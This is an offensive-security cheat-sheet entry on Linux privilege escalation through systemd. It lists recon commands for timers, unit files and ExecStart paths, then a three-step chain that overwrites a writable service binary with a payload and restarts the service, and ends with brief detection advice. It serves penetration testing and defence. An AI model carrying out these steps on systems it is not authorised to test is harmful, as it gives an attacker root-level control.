---
technique: systemd Abuse
category: privilege-escalation
targets: Linux systemd
protocols: Local
remote_capable: false
tags: linux privilege-escalation systemd services timers writable-service
---

# systemd Abuse

systemd abuse targets writable unit files, writable service binaries, relative `ExecStart` paths, and timers that trigger privileged services.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Writable unit or binary | Operator must modify a unit file, service binary, or searched path |
| Privileged trigger | A privileged user or timer must start, restart, or reload the service |
| Prepared payload | Payload construction belongs in a tool note |

## Linux

### List timers

#sh #systemd #recon

List systemd timers and their target units.

```sh title:"List systemd timers"
systemctl list-timers --all
```
<!-- cheat -->

### Show systemd PATH

#sh #systemd #recon

Print systemd manager environment variables.

```sh title:"Show systemd environment"
systemctl show-environment
```
<!-- cheat -->

### Print unit file

#sh #systemd #recon

Print the effective unit file for a service.

```sh title:"Print systemd unit"
systemctl cat "$unit_name"
```
<!-- cheat
var unit_name
-->

### Print ExecStart

#sh #systemd #recon

Print the configured service start command.

```sh title:"Print service ExecStart"
systemctl show -p ExecStart "$unit_name"
```
<!-- cheat
var unit_name
-->

### Check service binary

#sh #systemd #filesystem

Check permissions on a service executable.

```sh title:"Check service binary permissions"
ls -la "$service_binary"
```
<!-- cheat
var service_binary
-->

### Step 1: Replace writable service binary

#sh #systemd #file-write

Copy a prepared payload over a writable service executable.

```sh title:"Replace service binary"
cp "$payload_file" "$service_binary"
```
<!-- cheat
var payload_file
var service_binary
-->

### Step 2: Make service payload executable

#sh #systemd #file-write

Make the replacement service executable.

```sh title:"Make service payload executable"
chmod +x "$service_binary"
```
<!-- cheat
var service_binary
-->

### Step 3: Restart service

#sh #systemd

Restart the service to trigger the replacement binary.

```sh title:"Restart modified service"
systemctl restart "$unit_name"
```
<!-- cheat
var unit_name
-->

## Detection

Monitor changes to unit files, service binaries, timer definitions, daemon reloads, and services started from writable paths.
